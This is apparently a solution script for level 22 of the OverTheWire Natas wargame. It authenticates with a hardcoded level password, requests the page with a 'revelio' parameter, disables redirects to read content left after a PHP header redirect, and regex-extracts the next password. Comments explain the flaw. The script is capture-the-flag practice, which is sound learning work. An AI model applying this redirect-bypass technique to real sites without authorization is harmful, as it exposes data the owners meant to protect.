#!/bin/python3

import requests
import re
import html.parser

username = 'natas22'
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = 'http://%s.natas.labs.overthewire.org?revelio=true' % (username)
# data = { "admin" : "1" , "submit" : "Update" } 
session = requests.Session()

response = session.get(url + '' ,auth = (username,password), allow_redirects=False )
# cookies = {"PHPSESSID" : (response.cookies['PHPSESSID'])}
content = response.text
# print (content)
print (re.findall("Password: (.*)</pre>",content)[0])


#this one will allow you to read the password if a variable is sent 
#through GET named "revelio" (the value was irrelavant)
#unfortunately the page was redirecting requests if the variable was included 
#this can be avoided in the library im using 
#by simply disallowing redirects
#this allows us to see the entirety of the initial page as the function used
#to redirect (header) doesn't kill the session and will continue to send
#rest of the page 
